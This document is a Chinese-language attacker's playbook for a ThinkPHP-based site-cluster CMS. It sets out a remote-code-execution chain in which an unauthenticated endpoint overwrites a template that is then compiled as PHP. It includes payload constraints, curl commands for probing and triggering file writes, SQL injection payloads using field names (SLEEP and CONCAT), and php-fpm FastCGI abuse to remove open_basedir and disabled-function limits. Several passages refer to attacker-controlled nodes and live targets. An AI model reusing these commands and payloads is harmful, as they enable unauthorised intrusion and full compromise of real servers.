# 站群 CMS「模板烘焙」链 —— 完整机制 + 最短判定 + 两个否证 oracle

## 0. 一句话
该 CMS 用「后台/定时任务抓取自身 List 页 → `file_put_contents` 覆盖 `App/Tpl/Home/Index_*.html` → 前台 `display()` 渲染」的方式做页面预烘焙。
而框架配置 **`tmpl_deny_php => false`** ⇒ 被覆盖的模板里出现裸 `<?php` 会被编译并 include ⇒ **只要是能把任意内容写进该模板，就等于 RCE**。
⇒ 攻击价值全部集中在「**链的输入源**」（那个被抓取的 List 页）上。

## 1. 关键源码（同套代码，来自整站备份 `App/Lib/Action/`）

```php
// Home/OrderAction.class.php —— extends Action ⇒ 零鉴权、也不经 Home/CommonAction 的 REQUEST_URI WAF
class OrderAction extends Action{
  public function get_html1(){
    $rs = rand(11111,99999);
    $urlapp = "http://baexample".$rs."target397.example.com/List/getapp_html/type/1";
    $url    = "http://target396.example.com/List/index/type/0";
    $url1   = "http://target398.example.com/List/index/type/1";
    $content  = file_get_contents($url);
    $content1 = file_get_contents($url1);
    if(strlen($content) > 100){
      file_put_contents("./App/Tpl/Home/Index_example.com",    $content);   // ★ 模板被覆盖
      file_put_contents("./App/Tpl/Home/Index_indexapp.html", $content1);
    }
    $c122 = mb_convert_encoding(file_get_contents($urlapp),'UTF-8');
    /* DOMDocument 取 body innerHTML */
    file_put_contents("./Upload/atop/jquery3_6.txt", $innerHTML);
    file_put_contents("./Upload/atop/jquery3_5.txt", $c122);
    file_put_contents("./Upload/atop/attime3_5.txt", time());
  }
}
// Admin/ArticleAction::article_cdnhtml() 是同一段逻辑的后台版（另一组 abrdns 名 + 需会话），返回 {"ok":1,"msg":"成功请刷新"}
```

```php
// Home/IndexAction::index() —— 触发渲染的 Host 分支（决定能不能让被污染的模板真正被编译）
$domain = $_SERVER['HTTP_HOST'];
if(strpos($domain,"sp")       !== false){ $this->display("indexapp"); }   // → App/Tpl/Home/Index_indexapp.html
elseif(strpos($domain,"example") !== false){ $this->display("indexalert"); } // → 710B 防封壳页，不渲染被污染模板
else { $this->display(); }                                                // → App/Tpl/Home/Index_example.com ★ 必须用这种 Host
```

```php
// Core/Lib/Template/ThinkTemplate.class.php::parsePhp()
if(ini_get('short_open_tag')){
    $content = preg_replace('/(<\?(?!php|=|$))/i', '<?php echo \'\\1\'; ?>'."\n", $content);
}
if(C('TMPL_DENY_PHP') && false !== strpos($content,'<?php')) throw_exception(L('_NOT_ALLOW_PHP_'));  // ← 默认 false ⇒ 放行
// compiler(): parse → 还原 literal → 前置 '<?php if(!defined("THINK_PATH")) exit();?>' → str_replace('?><?php','')
//             → strip_whitespace()（TMPL_STRIP_SPACE=true：token_get_all 压空白、**删除所有注释**）
// 产物： C('CACHE_PATH') . md5($templateFile) . '.php'  然后 include
```

**payload 硬约束**（血的教训）：
- 不能含 `{` `}` —— `TMPL_L_DELIM='{'`/`R='}'` 会被当模板标签解析；
- 不能含字面量 `?><?php` —— 会被 `str_replace` 吃掉；
- 不能含 `//` 或 `/* */` 注释 —— `strip_whitespace()` 用 `token_get_all` **会删掉注释**，可能把后续代码挤到同一行；
- 必须语法完全合法（否则 `token_get_all` 之后整段被当字符串吞掉 → 编译产物坏掉 → 500 无回显）；
- 建议一行写完、`;` 分隔、用 hex/base64 承载二进制。

## 2. 最短判定流程（15 分钟定生死）

```bash
T=https://TARGET ; H='Host: example.<site>.<cluster>.top'   # ★ 该 CMS 的 Admin/Home 都按 Host 关键字分支，先用真实白名单 Host

# ① 模板是否可零凭证直读（拿到后台菜单 = 白名单 Host 正确）
curl -k -s --noproxy '*' -H "$H" "$T/App/Tpl/Admin/Public_left.html" | head -c 200

# ② 零凭证写文件原语
curl -k -s --noproxy '*' -H "$H" "$T/example.com?g=Home&m=Order&a=get_html1"
curl -k -s --noproxy '*' -H "$H" "$T/App/Tpl/Home/Index_example.com" -o a.html -w '%{size_download}\n'   # 调用前后比 size+md5

# ③ ★★ 判定抓取源到底是谁（决定整条链可不可用，见 §3 陷阱）
for f in jquery3_5.txt jquery3_6.txt attime3_5.txt; do
  curl -k -s --noproxy '*' -H "$H" "$T/Upload/atop/$f" -w "\n$f %{size_download}\n" | head -c 200
done

# ④ 触发渲染必须用「不含 sp、不含 example」的 Host
curl -k -s --noproxy '*' -H "Host: target393.example.com" "$T/example.com?g=Home&m=Index&a=index" | md5sum
```

## 3. ★ 陷阱 1：抓取源不是公网 DNS 能指到的那台
`*.target395.example.com` 是**通配名**，203.0.113.109/203.0.113.1/203.0.113.76/203.0.113.18/203.0.113.112 全部把这批名字解析到**我方已控的 203.0.113.31**；
但目标机 **不用公网 DNS**（本机 hosts / 内网 DNS → 集群内真实节点）。
⇒ 在 116 上植 `/List/index/type/0` 静态 payload **对目标完全无效**。
**判定方法**：跑一次 get_html1，然后回读 `/Upload/atop/jquery3_5.txt`（= `file_get_contents($urlapp)` 的原样内容）。
若它是我方页面的特征串 ⇒ 抓取源可控、链可用；若是真实业务页（且大小/结构与该站自身 List 页同源）⇒ 抓取源是集群内部，**必须换路径去拿「链的输入源」**。

## 4. ★ 陷阱 2：拿「链的输入源」时最容易白跑的几处
- `Home/List/index` 的 `type` / `cid` **完全惰性**：`type=0`、`type=99999`、`type=0'`、`cid=1 AND 1=1` 五种响应 **md5 完全相同**；源码 `ListAction::index()` 里根本没有 `$_GET['type']`（`pid=5089`、`ename=cont2` 全硬编码）。**不要在这浪费一轮。**
- `Home/Index::art_status` 的 `type` 是 `setInc()` 的**字段名**（`parseKey` 对含反引号/空格的 key 原样透传，理论可注入），但**加固版目标已修**：4 种注释构造（`-- `/`#`/`# `/`ORDER BY..LIMIT`）+ SLEEP 时延全否；同源旧版（116）可注入 ⇒ **新旧版代码不同步，必须点对点实测，别照抄结论**。
- `Admin/Wechat`（`extends Action`、签名可自算、echostr 是只读 oracle）的写文件落点是 `./Public/log/*.php`，而该目录在部署包里**根本不存在** ⇒ `file_put_contents` 只产生 E_WARNING（`appError` 对 WARNING 只记日志不 halt）⇒ **HTTP 层 200/0B 完全看不出失败**，别误判为成功。

## 5. 字段名注入的正确判定法（TP3 `setInc($field)` 通用）
```sql
-- setInc 生成的 SQL： UPDATE `tbl` SET `{parseKey(X)}`=(X + 1) WHERE ( `id` = <int> )
-- parseKey (DbMysql): $key=trim($key); if(!preg_match('/[,\'"\*\(\)`.\s]/',$key)) $key='`'.$key.'`';  ⇒ 含反引号/空格则原样透传
-- X 要写成「自带反引号闭合 + 用 -- 清掉尾部拼接」，MySQL 要求 -- 后必须有空白：
X = `title`=CONCAT(`title`,0x215254313736) WHERE `id`=14040 -- 
-- 有效 SQL 变为： UPDATE `article` SET `title`=CONCAT(`title`,0x215254313736) WHERE `id`=14040
-- 零改动时延 oracle（SLEEP 放 WHERE，永不命中 ⇒ 不写任何数据）：
X = `sort`=sort WHERE `id`=14040 AND SLEEP(8) -- 
```
判定要点：**同时用「时延 oracle」和「可见结果 oracle」两个独立视角**；只测有效应不测时延，会被"页面有静态缓存"骗过去（本目标的 List 页 md5 在多次调用中恒为 `8a8d91bd866ccb57`，看起来像缓存，实际是参数没进 SQL）。

## 6. 闭环条件（要么满足其一）
1. 目标机上存在**任意 .php 写入点**（如 `Admin/Api::article_save` 的 `./Public/www/main_r3_<ename>.php`，需会话；或 `Public/log/` 存在时的 Wechat 零凭证原语）⇒ 直接 RCE，无需本链；
2. 抓取源可控（§3 判定为"我方页面"）⇒ 直接 RCE；
3. 能往**同源 DB** 写入任意字符串（SQLi / 直连 MySQL）⇒ 把 `<?php ... ?>` 写进 List 页会渲染的任何字段（该 CMS 的 `{$vo.title|htmlspecialchars_decode}` 与 `{$cat.you}` 都是原样输出）⇒ get_html1 烘进模板 ⇒ RCE；
4. 拿到任意 PHP 执行点后**不必**走本链：直接 FastCGI 打本机 php-fpm（`PHP_ADMIN_VALUE="open_basedir=/\ndisable_functions="`）取全盘读写。

## 7. 本链在已控节点上的落地物（可复用）
- `/www/wwwroot/<site>/List/index/type/0`（静态文件，让 nginx 的 `if(!-e $request_filename)` 重写规则优先命中）—— **仅当抓取源=我方节点时才有效**。
